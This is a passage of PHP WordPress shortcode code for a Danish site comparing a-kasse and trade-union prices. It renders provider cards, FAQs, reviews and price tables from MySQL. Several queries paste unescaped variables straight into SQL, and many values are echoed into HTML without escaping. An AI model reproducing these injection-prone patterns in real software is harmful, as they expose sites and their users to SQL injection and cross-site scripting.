    font-size: 18px !important;
	}
	.fag_price {
    width: 50%;
    padding: 12px;
    font-size: 18px !important;
	}
	.checkmarks {
    width: 100%;
        font-size: 14px;
    margin-top: 0px;
    text-align: center;
	}
	.cta {
		width: 100%;
		margin-top: 10px;
	}
	.description {
		display:none;
	}
	.checkmarks p {
		display:inline;
		margin-right:10px;
	}
 }
  @media (max-width:500px) {
  .wrapper-custom4 {
    min-height: 215px;
  }
  .logo-custom4 {
    width: 30%;
    padding: 40px 0px;
	}
	.info {
		width: 70%;
	}
	.checkmarks {
    width: 100%;
        font-size: 14px;
    margin-top: 0px;
    text-align: center;
	}
	.checkmarks p {
		display:block;
		margin-right:0px;
		margin-bottom: -5px!important;
	}
 }


</style>
<?php if($prio == "prio" || $prio == "student" || $prio == "elev") { ?>
  <h2>4 gode <strong>a-kasser for <?php echo $keyword; ?></strong></h2>
  <p>Vi har herunder fundet 4 af de bedste og billigste tværfaglige a-kasser, hvor <?php echo $keyword; ?> kan melde sig ind. Hvis a-kasserne også tilbyder fagforening, er prisen for dette også angivet.</p>
<?php
} else if($prio == "fagforening") {
?>
<h2>Gode <strong>fagforeninger for <?php echo $keyword; ?></strong></h2>
<p>Vi har herunder fundet en række af de bedste og billigste fagforeninger, hvor <?php echo $keyword; ?> kan melde sig ind. Hvis fagforeningerne også tilbyder a-kasse, er prisen for dette også angivet.</p>
<?php
}
?>
<?php
global $db;
if($prio == "prio") {
    $get_list = "SELECT * FROM data WHERE ACTIVE = 1 ORDER BY prio ASC LIMIT 4";
} else if($prio == "student" || $prio == "elev") {
	  $get_list = "SELECT * FROM data WHERE student_commision = 1 ORDER BY prio ASC LIMIT 4";
}
else if($prio == "fagforening") {
	  $get_list = "SELECT * FROM data WHERE fagforening_pris > 0 AND ACTIVE = 1 ORDER BY prio ASC LIMIT 5";
} elseif($akasse1 != "") { //bruges ved job-search
  $akasse2 = !empty($akasse2) ? $akasse2 : 999;
  $akasse3 = !empty($akasse3) ? $akasse3 : 999;
  $get_list = "SELECT * FROM data WHERE ID IN ($akasse1, $akasse2, $akasse3) ORDER BY 
               CASE 
                   WHEN ID = $akasse1 THEN 0
                   WHEN ID = $akasse2 THEN 1
                   WHEN ID = $akasse3 THEN 2
                   ELSE 3
  END, prio ASC";
}

$result_list = $db->query($get_list);


while ($row_list = mysqli_fetch_array($result_list)) {

    $aktiv = $row_list["ACTIVE"];
    $affiliate_url = $row_list["AFFILIATE_URL"];
	$pris_mdr = $row_list["PRIS_MDR"];
	$fag_pris = $row_list["fagforening_pris"];
	$id = $row_list["ID"];
    $udbyder = $row_list["UDBYDER"];
	$udbyder_display = $row_list["udbyder_display"];
	$logo = $row_list["logo"];
	$billig_desc = $row_list["billig_desc"];
	$optagelse = $row_list["OPTAGELSE"];
	$fagforening_pris = $row_list["fagforening_pris"];
	$tp = $row_list["TRUSTPILOT_SCORE"];
	if ($aktiv != 0) {
   ?>

<div class="wrapper-custom4" onclick="go_udbyder('<?php echo $id; ?>');">
	<div class="logo-custom4">
      <img src="<?php echo $logo; ?>" alt="<?php echo $name_display; ?> a-kasse for <?php echo $keyword; ?>" title="A-kasse for <?php echo $keyword; ?>"/>
    </div>
     <div class="info">
       <?php if($prio == "fagforening") {  // vi bytter om, saa fagforening ligger forrest ?>
     	  <div class="akasse_price">
          <?php if($fag_pris==0) { ?>
           <span style="font-size:12px;display:block;padding-top:7px;">Ingen</span><span style="font-size:12px;display: block;">fagforening</span>
          <?php } else { ?>
          <strong><?php echo $fag_pris; ?></strong> <span class="denotion">kr./md.</span><span class="specs">Fagforening</span>
          <?php }?>
        </div>
        <div class="fag_price">
          <?php if($prio == "student") { ?><strong>Gratis</strong><span class="specs">for studerende</span>
          <?php } elseif ($prio == "elev") { ?>
          <strong>Gratis</strong><span class="specs">for elever & lærlinge</span>
  		    <?php } else { ?>
          <strong><?php echo $pris_mdr; ?></strong> <span class="denotion">kr./md.</span><span class="specs">A-kasse</span>
          <?php } ?>
        </div>
      <?php } else { ?>
        <div class="akasse_price">
          <?php if($prio == "student") { ?>
          <strong>Gratis</strong><span class="specs">for studerende</span>
          <?php } elseif ($prio == "elev") { ?>
          <strong>Gratis</strong><span class="specs">for elever & lærlinge</span>
          <?php } else { ?>
          <strong><?php echo $pris_mdr; ?></strong> <span class="denotion">kr./md.</span><span class="specs">A-kasse</span>
          <?php } ?>
        </div>
        <div class="fag_price">
          <?php if($fag_pris==0) { ?>
           <span style="font-size:12px;display:block;padding-top:7px;">Ingen</span><span style="font-size:12px;display: block;">fagforening</span>
          <?php } else { ?>
          <strong><?php echo $fag_pris; ?></strong> <span class="denotion">kr./md.</span><span class="specs">Fagforening</span>
          <?php }?>
        </div>

      <?php } ?>
        <div class="checkmarks">
        <p><span class="glyphicon glyphicon-ok"></span> Optager <?php echo $keyword; ?></p>
        <p><span class="glyphicon glyphicon-ok"></span> <?php echo $tp; ?> / 5 på Trustpilot</p>
        </div>
        <div class="cta">
        	<span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> LÆS MERE</span>
        </div>
        <div class="description">
  	   <p><span class="glyphicon glyphicon-hand-right" style="font-weight:600;"></span> <?php echo $udbyder_display; ?> <?php echo $billig_desc; ?>.<?php if($prio == "student" || $prio == "elev") { ?> Normalpris: <strong><?php echo $pris_mdr; ?> kr./md.</strong><?php } ?></p>
       </div>
    </div>


</div>



<?php
}
}
?>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<p class="updatedate">Data opdateret: <?php echo $updated; ?></p>
<?php
if($prio != "fagforening") {
global $db;
$get_recommended = "SELECT rec FROM jobs WHERE job_flertal = '$keyword' LIMIT 1";
$result_recommended = $db->query($get_recommended);
if ($result_recommended && $result_recommended->num_rows > 0) {
   echo "<p>Følgende a-kasser kan anbefales til ". $keyword .":</p>";
    while ($row_recommended = mysqli_fetch_array($result_recommended)) {
        $rec_id = $row_recommended["rec"];
        $get_list = "
        (SELECT * FROM data WHERE id = '$rec_id')
        UNION ALL
        (SELECT * FROM data WHERE id != '$rec_id' ORDER BY prio ASC LIMIT 4);
        ";
        $result_list = $db->query($get_list);
        if ($result_list && $result_list->num_rows > 0) {
            echo "<ul>\n";
            while ($row = $result_list->fetch_assoc()) { 
              $udbyder_display = $row["udbyder_display"]; ?>
             <li><?php echo $row["udbyder_display"]; ?> <?php if (strpos($row["udbyder_display"], 'A-kasse') == false) { echo "a-kasse"; } ?></li>
             <?php
         }
            echo "</ul>";
        } 
    }
} else {
  echo "<p>Følgende a-kasser kan anbefales til ". $keyword .":</p>";
  $get_list = "SELECT * FROM data ORDER BY prio ASC LIMIT 4";
  $result_list = $db->query($get_list);
  if ($result_list && $result_list->num_rows > 0) {
      echo "<ul>\n";
      // Loop through the rows and create list items
      while ($row = $result_list->fetch_assoc()) { 
           $udbyder_display = $row["udbyder_display"]; ?>
          <li><?php echo $row["udbyder_display"]; ?> <?php if (strpos($row["udbyder_display"], 'A-kasse') == false) { echo "a-kasse"; } ?></li>
          <?php
      }
      echo "</ul>";
  }
}
}
return ob_get_clean();
	}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'custom4', 'custom4' );
}

function custom4_skift_akasse($atts) {
 ob_start();
 ?>
 <script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
</script>
<style>

 .wrapper-custom4 {
	box-shadow: 0px 3px 6px #155cce29;
    margin: 15px 0px;
    background-color: #FFFFFF;
    border-top: 2px solid #f4f4f4;
    padding:15px;
    align-items: center;
    min-height: 156px;
    color: black;
	cursor:pointer;
  }
  .wrapper-custom4:hover {
	border-top: 1px solid #9bbdf2c7;
	box-shadow: 0px 3px 6px #155ccec7;
   }
	.logo-custom4 {
		width: 25%;
		float: left;
		padding: 40px;
	}
	.info {
    width: 75%;
    float: left;
	}
	.akasse_price {
   width: 20%;
    float: left;
    padding: 14px;
    text-align: center;
    font-size: 20px !important;
	}
		.fag_price {
width: 20%;
    float: left;
        padding: 14px;
    text-align: center;
    font-size: 20px !important;
	}
		.checkmarks {
		width:30%;
		float:left;
		 font-weight:600;
		 font-size: 14px;
         margin-top: 10px;
	}
		.cta {
      float: left;
      font-weight:600;
      margin-left: auto;
      margin-right: auto;
      padding: 10px;
      width: 60%;
      text-transform: uppercase;
	}
	.description {
		width:100%;
		font-size:14px;
		float:right;
		padding: 0px 0px 0px 15px;
	}
	.checkmarks .glyphicon-ok {
		color:#337ab7;
	}
	.checkmarks p {
		margin-bottom:2px;
	}
	.wrapper-custom4 .specs {
    font-size: 12px;
    }
  .cta-online {
    font-size: 12px;
    font-weight:600;
    display: block;
    text-align: center;
    margin-top: 5px;

  }
 @media (max-width:1200px) {
  .wrapper-custom4 {
    min-height: 200px;
  }
  .logo-custom4 {
    width: 25%;
    padding: 40px 0px;
	text-align: center;
	}
	.info {
		width: 75%;
	}
	.akasse_price {
    width: 50%;
    padding: 12px;
    font-size: 18px !important;
	}
	.fag_price {
    width: 50%;
    padding: 12px;
    font-size: 18px !important;
	}
	.checkmarks {
    width: 100%;
    font-size: 14px;
    margin-top: 0px;
    text-align: center;
	}
	.cta {
		width: 100%;
		margin-top: 20px;
    padding: 0px!important;
	}
	.description {
		display:none;
	}
	.checkmarks p {
		display:inline;
		margin-right:10px;
	}
 }
  @media (max-width:500px) {
  .wrapper-custom4 {
    min-height: 195px;
  }
  .logo-custom4 {
    width: 30%;
    padding: 40px 0px;
	}
	.info {
		width: 70%;
	}
	.checkmarks {
    width: 100%;
        font-size: 14px;
    margin-top: 0px;
    text-align: center;
	}
	.checkmarks p {
		display:block;
		margin-right:0px;
		margin-bottom: -5px!important;
	}
 }


</style>
<?php
global $db;
$get_list = "SELECT * FROM data ORDER BY prio ASC LIMIT 5";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {

  $aktiv = $row_list["ACTIVE"];
  $affiliate_url = $row_list["AFFILIATE_URL"];
	$pris_mdr = $row_list["PRIS_MDR"];
	$fag_pris = $row_list["fagforening_pris"];
	$id = $row_list["ID"];
  $udbyder = $row_list["UDBYDER"];
	$udbyder_display = $row_list["udbyder_display"];
	$logo = $row_list["logo"];
	$billig_desc = $row_list["billig_desc"];
	$optagelse = $row_list["OPTAGELSE"];
	$fagforening_pris = $row_list["fagforening_pris"];
	$tp = $row_list["TRUSTPILOT_SCORE"];
	if ($aktiv != 0) {
   ?>

<div class="wrapper-custom4" onclick="go_udbyder('<?php echo $id; ?>');">
	<div class="logo-custom4">
      <img src="<?php echo $logo; ?>" alt="Skift til <?php echo $name_display; ?>" title="Skift til <?php echo $name_display; ?>"/>
    </div>
     <div class="info">
     	<div class="akasse_price">
        <strong><?php echo $pris_mdr; ?></strong> <span class="denotion">kr./md.</span><span class="specs">A-kasse</span>
        </div>
        <div class="fag_price">
        <?php if($fag_pris==0) { ?>
         <span style="font-size:12px;display:block;padding-top:7px;">Ingen</span><span style="font-size:12px;display: block;">fagforening</span>
        <?php } else { ?>
        <strong><?php echo $fag_pris; ?></strong> <span class="denotion">kr./md.</span><span class="specs">Fagforening</span>
        <?php }?>
        </div>
        <div class="cta">
        	<span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> SKIFT TIL <?php echo $udbyder_display; ?></span>
          <span class="cta-online"><span class="glyphicon glyphicon-ok"></span> Nem Online indmeldelse</span>
        </div>
        <div class="description">
  	   <p><span class="glyphicon glyphicon-hand-right" style="font-weight:600;"></span> <?php echo $udbyder_display; ?> <?php echo $billig_desc; ?></p>
       </div>
    </div>


</div>
<?php
}
}
?>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<p>Data opdateret: <?php echo $updated; ?></p>
<?php
return ob_get_clean();
	}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'custom4_skift_akasse', 'custom4_skift_akasse' );
}

function trustpilot_history($atts) {
	$a = shortcode_atts( array(
        "udbyder" => "",
        "show" => "",
        "notext"=>"",
    ), $atts );
	global $udbyder;
  global $show;
  global $db;
	$udbyder = $a['udbyder'];
  $show = $a['show'];
  $notext = $a['notext'];
  $get_list = "SELECT udbyder_display FROM data WHERE id='$udbyder'";
  $result_list = $db->query($get_list);
  while ($row_list = mysqli_fetch_array($result_list)) {
  	$name = $row_list['udbyder_display'];
  }
  if (strtolower($notext) != "true") {
  if($show=="medlem") {
    $show_string = "Se udvikling";
  } else {
    $show_string = "Se Trustpilot historik";
  }
  $css = "class='modal-graph-css'";
  } else {
    $css = "style='cursor: pointer;'";  
  }
ob_start();
?>
<span onclick="getinfo('<?php echo $udbyder; ?>','<?php echo $name; ?>','<?php echo $show; ?>')" data-toggle="modal" data-target="#myModal_<?php echo $udbyder; ?>" <?php echo $css ?>><?php echo $show_string; ?> <svg data-toggle='tooltip' data-container='body' title='Klik for at se graf' style="margin-bottom: -2px;" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-graph-up" viewBox="0 0 16 16">
  <path fill-rule="evenodd" d="M0 0h1v15h15v1H0V0Zm14.817 3.113a.5.5 0 0 1 .07.704l-4.5 5.5a.5.5 0 0 1-.74.037L7.06 6.767l-3.656 5.027a.5.5 0 0 1-.808-.588l4-5.5a.5.5 0 0 1 .758-.06l2.609 2.61 4.15-5.073a.5.5 0 0 1 .704-.07Z" />
</svg></span><span id="myModal_<?php echo $udbyder; ?>" class="modal fade" role="dialog"></span>
<?php
return ob_get_clean();
}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'trustpilot_history', 'trustpilot_history' );
}

function faq($atts) {
	$a = shortcode_atts( array(
		"category" => "",
		"heading" => "",
		"first_paragraph" => "",
    ), $atts );
	$category = $a['category'];
	$heading = $a['heading'];
	$first_paragraph = $a['first_paragraph'];
	ob_start();
	?>
    <h2><?php echo $heading ?></h2>
	<p><?php echo $first_paragraph ?></p>
	<style>
	.faq_container{clear:both;position:relative;height:900px;overflow-y:hidden;}
	.faq_container::after{content:"";display:block;clear:both}
	.faq_container .faq{padding: 5px 10px 5px 15px;background-color:#fff;border-radius:3px;border:1px solid #f1f1f1;margin-bottom:10px;display:block;max-width:700px;cursor:pointer}
	.faq_question{margin:0;display:inline-block;font-weight:600;font-size:16px;margin-top:5px;margin-bottom: 5px!important;}
	.faq_answer_container{height:0;overflow:hidden;padding:0;font-size:16px}
	.faq_container .glyphicon{font-size:16px;margin-right:10px}
	.nordicway_faq_h3 {margin-top:40px}
	.faq_question {color:#5f5f5f!important}
	#full_table_faq {
    position: absolute;
    z-index: 998;
    padding: 40px;
    bottom: 0;
    left: 0;
    display: block;
    cursor: pointer;
    max-width:700px;
    width: 100%;
    height: 200px;
    background: linear-gradient(to bottom,rgba(255,255,255,0) 0%,#F5F5F5 60%,#F5F5F5 32%,#F5F5F5 100%);
    background: -webkit-linear-gradient(top,rgba(255,255,255,0) 0%,#F5F5F5 60%,#F5F5F532%,#F5F5F5 100%);
    background: -moz-linear-gradient(top,rgba(255,255,255,0) 0%,rgba(245,245,245) 60%,rgba(245,245,245) 32%,rgba(245,245,245) 100%);
    filter: progid: DXImageTransform.Microsoft.gradient(startColorstr='#00ffffff',endColorstr='#fff',GradientType=0);
    text-align: center;
    font-size: 24px;
    text-decoration: none;
    color: #666;
	}
	@media only screen and (max-width: 767px){
		.faq_left,.faq_right{width:100%}
	}
	</style>
	<script>
	jQuery(document).ready(function() {
		jQuery('.faq').click(function() {
			if (jQuery(this).is('.open')){
				jQuery(this).closest('.faq').find('.faq_answer_container').animate({'height':'0'},200);
				jQuery(this).closest('.faq').removeClass('open');

				}else{
					var newHeight =jQuery(this).closest('.faq').find('.faq_answer').height() +'px';
					jQuery(this).closest('.faq').find('.faq_answer_container').animate({'height':newHeight},200);
					jQuery(this).closest('.faq').addClass('open');
				}
			jQuery("em", this).toggleClass("glyphicon-chevron-up glyphicon-chevron-down");
		});
		$('#full_table_faq').click(function(){
		$('.faq_container').css("height","100%");
		$('#full_table_faq').hide();
		});
	});
	</script>
	<div class="faq_container" itemscope itemtype="https://schema.org/FAQPage">
	<?php
	global $db;
	$get_faqs = "SELECT * FROM faqs WHERE categories LIKE '%{$category}%'";
	$result_faqs = $db->query($get_faqs);
	$number_of_faqs = mysqli_num_rows($result_faqs);
	while ($row_list = mysqli_fetch_array($result_faqs)) {
		$question = $row_list['question'];
		$anwser_section1 = $row_list['anwser_section1'];
		$shortcode = $row_list['shortcode'];
		$shortcode_parameter = $row_list['shortcode_parameter'];
		$shortcode_parameter2 = $row_list['shortcode_parameter2'];
		$anwser_section2 = $row_list['anwser_section2'];
		?>
		<div class="faq" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
		<p class="faq_question" itemprop="name" ><em class="glyphicon glyphicon-chevron-down"></em><?php echo $question; ?></p>
		<div class="faq_answer_container" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer" >
			<div class="faq_answer" itemprop="text">
				<p><?php echo $anwser_section1 ?></p>
				<?php if(!empty($shortcode)) { 
					// avaliable shortcodes in FAQ
					if($shortcode == "udbyder_list_simple") {
						echo udbyder_list_simple(array(""=>""));
					} elseif($shortcode == "cheapest_fastnet") {
						echo cheapest_fastnet(array("type"=>$shortcode_parameter,"get"=>$shortcode_parameter2));
					} elseif($shortcode == "tech_list_simple") {
						echo tech_list_simple(array(""=>""));
					} elseif($shortcode == "billigste_mobilt_bredbaand_simple") {
						echo billigste_mobilt_bredbaand_simple(array("get"=>$shortcode_parameter));
					}
				}
				if(!empty($anwser_section2)) { ?>
				<p><?php echo $anwser_section2; ?></p>
				<hr/>
				<?php } ?>
			</div>
		</div>
		</div>
	<?php
	}
	if($number_of_faqs>13) { ?>
		<span id="full_table_faq"><span style="margin-top:40px;display:block;">Se flere svar <span class="glyphicon glyphicon-chevron-down"></span></span></span>
    <?php
	}
	?>
	</div>
	<?php
	return ob_get_clean();
		 }
	global $wp_query;
	if (isset($wp_query->post->ID) ) {
	add_shortcode( 'faq', 'faq' );
	}

  function if_udbyder_aktiv($atts, $content = null) {
    $attributes = shortcode_atts(array('udbyder' => '',
    ), $atts);
    $udbyder = $attributes['udbyder'];
    global $db;
    $get_list = "SELECT * FROM data WHERE UDBYDER='$udbyder'";
    $result_list = $db->query($get_list);
    while ($row_list = mysqli_fetch_array($result_list)) {
      $active = $row_list['ACTIVE'];
    }
    $is_condition_met = ($active === '1'); // Example condition
    $parts = explode('[ikkeaktiv]', $content);
    $true_content = $parts[0];
    $else_content = isset($parts[1]) ? $parts[1] : ''; // Default to empty string if no else part is provided

    if ($is_condition_met) {
        // Return the true part of the content
        return do_shortcode(trim($true_content));
    } else {
        // Return the else part of the content, if available
        return do_shortcode(trim($else_content));
    }
}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'if_udbyder_aktiv', 'if_udbyder_aktiv' );
}

function custom_review($atts) {
  $a = shortcode_atts( array(
    "fordele" => "",
    "ulemper" => "",
    "logo" => "",
    "name" => "",
    "keyword" => "",
    ), $atts );
  $fordele = $a['fordele'];
  $ulemper = $a['ulemper'];
  $logo = $a['logo'];
  $name = $a['name'];
  $keyword = $a['keyword'];
  global $db;
  $get_list = "SELECT * FROM data WHERE udbyder='$name'";
  $result_list = $db->query($get_list);
  while ($row_list = mysqli_fetch_array($result_list)) {
  $affiliate_url = $row_list["AFFILIATE_URL"];
	$score = $row_list["SCORE"];
	$tp = $row_list["TRUSTPILOT_SCORE"];
  $udbyder_display = $row_list["udbyder_display"];
	$tp_count = $row_list["count"];
  $cka = $row_list["cka"];
	$optagelse = $row_list["OPTAGELSE"];
	$pris_mdr_akasse = $row_list["PRIS_MDR"];
	$pris_mdr_fag = $row_list["fagforening_pris"];
	$aktiv = $row_list["ACTIVE"];
  $id = $row_list["ID"];
  }
  ob_start();
  ?>

  <style>
.custom_review_div_container p{margin-bottom: 5px;}.price_score,.pro_con{font-weight:600;font-size:18px}.custom_review_div_container{border-top:1px solid;padding-top:10px}.price_score{margin-right:10px}.pro_con{display:block}.logo_custom_review{cursor:pointer;float:right;max-width:250px;margin:30px 0 20px}@media (max-width:768px){.logo_custom_review{float:none;max-width:200px;display:block}}
  </style>
     <script>
       jQuery(document).ready(function($){
       $('[data-toggle="tooltip"]').tooltip(); 
       });
   </script>
  <div class="custom_review_div_container">
    <img onclick="go_udbyder('<?php echo $id; ?>');" src="<?php echo $logo ?>" class="logo_custom_review" alt="<?php echo $keyword ?> fra <?php echo $udbyder_display ?>"  />
    <?php if(!empty($score)) { ?><p><span class="price_score">Vores score:</span><span><?php echo $score ?>/10</span></p><?php } ?>
    <?php if(!empty($pris_mdr_akasse)) { ?><p><span class="price_score">Pris for a-kasse:</span><span><?php echo $pris_mdr_akasse; ?> kr. /md.</span></p><?php } ?>
    <?php if(!empty($pris_mdr_fag)) { ?><p><span class="price_score">Pris for fagforening:</span><span><?php echo $pris_mdr_fag; ?> kr. /md.</span></p><?php } ?>
    <p><span class="price_score">Optagelse:</span><span><?php echo $optagelse; ?></span><br>
    <?php if(!empty($tp_count) && !empty($tp)) { ?><p><span class="price_score">Trustpilot:</span><span><?php echo $tp ?>/5 (<?php echo $tp_count ?> anmeldelser) <?php echo trustpilot_history(array("udbyder"=>$id)); ?></span></p><?php  } ?>
    <?php 
        $get_last_3_years= "SELECT members FROM membercount_history WHERE udbyder=$id ORDER BY month DESC LIMIT 3";
        $result_last_3_years = $db->query($get_last_3_years);
        $years = array();
        while ($row = mysqli_fetch_array($result_last_3_years)) {
          $years[] = $row["members"];
        }
        $years_reversed = array_reverse($years);
        $value_at_index_0 = intval($years_reversed[0]);
        $value_at_index_2 = intval($years_reversed[2]);
        if ($value_at_index_2 > $value_at_index_0) {
            $arrow = "<span class='glyphicon glyphicon-arrow-down' style='color:#28a745;transform: rotate(220deg);margin-right:4px;'></span>";
        } elseif ($value_at_index_2 < $value_at_index_0) {
            $arrow = "<span class='glyphicon glyphicon-arrow-down' style='color:#dc3545;transform: rotate(320deg);margin-right:4px;'></span>";
        } 
        $get_members= "SELECT * FROM membercount_history WHERE udbyder=$id ORDER BY month DESC LIMIT 1";
        $result_members = $db->query($get_members);
        while ($row = mysqli_fetch_array($result_members)) {
          $members = $row["members"];
          $month = $row["month"];
          if(!empty($members)) {
          echo "<p><span class='price_score'>Antal medlemmer:</span><span>" . number_format($members,0,"",".") . " (januar " . $month . ") " . $arrow . trustpilot_history(array("udbyder"=>$id,"show"=>"medlem")) . "</span></p>";
          }
        }
    ?>
    <?php if(!empty($cka)) { ?><p><strong>Klager per 1000 medlemmer:</strong> <?php echo $cka ?> <span style="font-size:12px;">(Gennemsnit 2023: <?php  echo general_info(array("get_this"=>"cka_snit","year"=>"2023")); ?> ) </span><span class="glyphicon glyphicon-info-sign" style="color:#333; cursor:pointer;" data-toggle="tooltip" data-container="body" title="Hvis et medlem af en a-kasse ønsker at klage over en afgørelse, som akassen har truffet, f.eks. i forhold til udbetaling af dagpenge, kan medlemmet få sin klage behandlet i Center for Klager om Arbejdsløshedsforsikring (CKA). Styrelsen for Arbejdsmarked og Rekruttering (STAR) udgiver på baggrund af denne mulighed hvert år en statistik over de sager, som CKA behandler. Det gennemsnit du ser er blandt alle danske a-kasser."></span></p><?php } ?>
    <span class="pro_con" style="margin-top: 10px;">Fordele:</span>
    <p style="margin-bottom:15px;">
    <?php
    $fordele = explode('|', $fordele, );
    foreach ($fordele as $item) { ?>
    <span style="color:green;font-weight:600;margin-left: 10px;" aria-hidden="true">✓</span> <?php echo $item; ?><br>
    <?php
    }
    ?>
    </p>
    <span class="pro_con">Ulemper:</span>
    <p style="margin-bottom:15px;">
    <?php
    $ulemper = explode('|', $ulemper, );
    foreach ($ulemper as $item) { ?>
    <span style="color:red;font-weight:600;margin-left: 10px;" aria-hidden="true">×</span> <?php echo $item; ?><br> 
    <?php
    }
    ?>
    </p>  
    <?php if($aktiv == 1) { ?>
    <p><span class="btn btn-block btn-primary btn-success" style="font-weight:600; max-width: 250px;" onclick="go_udbyder('<?php echo $id; ?>');">Besøg <?php echo $udbyder_display; ?> <span class="glyphicon glyphicon-circle-arrow-right"></span></span></p>
    <?php } ?>
  </div>
  <?php
  return ob_get_clean();
     }
  global $wp_query;
  if (isset($wp_query->post->ID) ) {
  add_shortcode( 'custom_review', 'custom_review' );
  }

  function price_change_table($atts) {
    $a = shortcode_atts( array(
      "year1" => "",
      "year2" => "",
      ), $atts );
    $year1_picked = $a['year1'];
    $year2_picked = $a['year2'];
    ob_start();
    ?>
    <div class="table-responsive">
   <table class="table" style="max-width:700px;" >
  <thead>
  <th>A-kasse</th>
  <th>2024 pris</th>
  <th>2023 pris</th>
  <th>Ændring</th>
  </thead>
  <tbody> 
   <?php
   global $db;
   $get_list = "SELECT * FROM a_kasse_priser WHERE display=1";
   $result_list = $db->query($get_list);
   while ($row_list = mysqli_fetch_array($result_list)) {
     $udbyder= $row_list["udbyder"];
     $year1= $row_list[$year1_picked];
     $year2 = $row_list[$year2_picked];
     $change = $year1-$year2;
     if ($change < 0) {
      $change_display = "-";
  } elseif ($change > 0) {
     $change_display = "+";
  } else {
     $change_display = "";
  }
   ?>
   <tr>
    <td><?php echo $udbyder; ?></td>
    <td><?php echo $year1; ?> <span class="denotion">kr./md.</span></td>
    <td><?php echo $year2; ?> <span class="denotion">kr./md.</span></td>
    <td><?php echo $change_display.$change; ?> <span class="denotion">kr./md.</span></td>
  </tr>
   <?php
   }?>
  </tbody> 
  </table>
  </div>
   <?php
   return ob_get_clean();
      }
      global $wp_query;
   if (isset($wp_query->post->ID) ) {
   add_shortcode( 'price_change_table', 'price_change_table' );
   }


   function new_div_display($db) {
    ob_start();
    ?>
   <script>
       jQuery(document).ready(function($){
       $('[data-toggle="tooltip"]').tooltip(); 
       $('#full_table').click(function(){
             $( "#full_table" ).hide();
             $('.fuld-oversigt').css("height","100%");
       });
       });
   </script>
   <style>
.fuld-oversigt{height:2173px}.akasse_contact_info p{line-height:1.2em}.akasse-show-more-info ul{font-size:14px}.akasse-show-more-info p{font-size:14px!important}.akasse-show-more-info-title{font-size:18px;font-weight:600;margin-bottom:5px}.akasse-info-column{margin-top:7px;margin-bottom:5px}.akasse-results-container{padding-right:0}.akasse-cards-container{margin-bottom:25px}.row{margin-left:-15px;margin-right:-15px}.akasse-card-container{margin:15px 0;background-color:#fff;border:1px solid #cccbc8;transition:transform .5s,box-shadow .5s;border:none;box-shadow:1px 2px 5px 0 #cccbc8}.akasse-card-container:hover{box-shadow:6px 6px 6px 0 rgba(176,176,176,.48);transition:transform .5s,box-shadow .5s}.akasse-inner-content{margin:15px 0;justify-content:space-between;align-items:center}.akasse-product-name-container{padding:7px 15px;border-bottom:1px solid #dedcd9;align-items:center;display:flex}.akasse-inner-content .akasse-metrics{width:100%;display:flex;table-layout:fixed;justify-content:flex-start;align-items:normal}button{color:inherit;font:inherit;margin:0;overflow:visible;text-transform:none;-webkit-appearance:button;cursor:pointer;font-family:inherit;font-size:inherit;line-height:inherit;outline:0!important}.akasse-show-more-btn{border:1px solid #cccbc8;background-color:#fff;font-weight:700;font-size:14px}.akasse-inner-content .akasse-show-more-btn{margin:0 0 0 10px;width:calc(100% - 60% - 10px);border-radius:3px}.akasse-button-card-column{padding-left:0;padding-right:0}.akasse-inner-content .akasse-card-column{padding:0 15px;flex-grow:1;flex-basis:0;overflow:hidden}.akasse-inner-content .akasse-card-column.akasse-button-card-column{flex-grow:1.5}.akasse-footer-container{display:table-cell;vertical-align:middle;display:flex;align-items:center;background-color:#fafafa;width:100%;margin-top:10px}.akasse-footer-container.akasse-timeLimited{background-color:rgb(206 232 255 / 54%)}.akasse-footnote-display{font-size:12px;margin-left:6px}.akasse-show-more-container{width:100%;padding:15px}.akasse-product-name{margin-right:8px;font-size:16px;font-weight:700;line-height:1;text-align:left;color:#312f2e}.akasse-inner-content .akasse-metrics .akasse-card-column{display:table-cell;vertical-align:top}.akasse-column-secondary{margin-top:4px;font-size:12px;line-height:1;text-align:center;color:#979290}.akasse-column-primary{font-weight:700;font-size:20px;line-height:1;text-align:center;color:#312f2e}.akasse-inner-content .akasse-column-primary{word-break:break-word}.akasse-inner-content .akasse-card-column__value{font-size:20px;line-height:1;margin-top:5px}.akasse-inner-content .akasse-card-column__title{margin-top:4px;color:#337ab7;font-size:12px;font-weight:700;line-height:1}.akasse-footer-container .akasse-banner-display{font-size:15px}.akasse-footnote-display li{float:left;margin-right:20px}.akasse-product-name-container .akasse-product-label{margin-right:5px;padding:3px 8px;border-radius:2px;color:#fff;font-size:11px;line-height:1.4}.akasse-product-name-container .akasse-product-label.akasse-featured{background-color:#f9b515}.akasse-product-name-container .akasse-product-label.akasse-timeLimited{background-color:#be007f}.akasse-inner-content .akasse-metrics .akasse-product-image{max-width:100px}.akasse-inner-content .akasse-card-column__value.akasse-text{font-size:18px;line-height:23px}.akasse-footer-container .akasse-banner-title{font-weight:700}.akasse-footer-container .akasse-banner-title.akasse-timeLimited{color:#474546}.akasse-footer-container .akasse-banner-title.akasse-exclusive{color:#77aa43}.akasse-product-image-small{display:none}.akasse-footnote-ul{padding:0 10px}@media 